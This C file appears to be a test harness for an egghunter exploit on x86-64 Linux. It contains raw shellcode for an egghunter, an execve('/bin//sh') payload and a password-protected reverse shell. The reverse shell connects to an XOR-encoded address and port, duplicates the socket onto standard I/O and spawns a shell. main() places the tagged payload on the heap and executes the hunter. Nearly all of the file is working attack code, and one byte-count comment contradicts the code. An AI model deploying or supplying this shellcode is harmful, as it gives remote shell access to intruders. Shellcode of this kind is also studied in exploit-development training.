#include <stdio.h>
#include <string.h>
#include <stdlib.h>

//egg precedes payload when we put on heap with malloc
//8 bytes
char egg[] = "mrtfegg\x23";

//This is egghunter shellcode
unsigned char code[] = "\x48\x31\xf6\x6a\x15\x58\x52\x5f\x48\x83\xc2\x08\x0f\x05\x3c\xf2\x74\xf1\x48\xb8\x6d\x72\x74\x66\x65\x67\x67\x23\x48\x3b\x07\x75\xe2\xff\xe2";


//execve payload - 157 bytes
unsigned char execve_payload[] = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

//rev shell payload - :
unsigned char payload[] = "\x48\x31\xc0\xb0\x29\x48\x31\xff\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x0f\x05\x48\x89\xc7\x52\x52\xc7\x44\x24\x04\x5c\x23\x23\x22\x81\x74\x24\x04\x23\x23\x23\x23\x66\xc7\x44\x24\x02\x7a\x69\xc6\x04\x24\x02\x48\x31\xc0\xb0\x2a\x48\x89\xe6\xb2\x10\x0f\x05\x48\x31\xc0\xb0\x21\x48\x31\xf6\x0f\x05\x48\x31\xc0\xb0\x21\x48\x31\xf6\x40\xb6\x01\x0f\x05\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x48\x31\xd2\xb2\x08\x0f\x05\x48\xbb\x6d\x72\x74\x66\x73\x68\x31\x0a\x48\x8b\x3c\x24\x48\x39\xfb\x75\x20\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\x90";
main()
{
	//strlen ok here bc no nulls in either
	printf("mallocing memory for execve payload:\t%d byte egg\t%d byte payload\n\n", (int)strlen(egg), (int)strlen(payload));
	//malloc space for egg + reverse shell (157+8)
	char *sc_loc;
	size_t payload_len = strlen(egg) + strlen(payload);
	sc_loc = malloc(payload_len);	
	//memcpy egg, then payload so it is all in some unknown loc in memory
	memcpy(sc_loc, egg, (int)strlen(egg));
	memcpy(sc_loc+8,payload,(int)strlen(payload));
	printf("egg and payload copied to start address %p\n\n",sc_loc);

	printf("executing egghunter routine.. length:  %d bytes\n\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

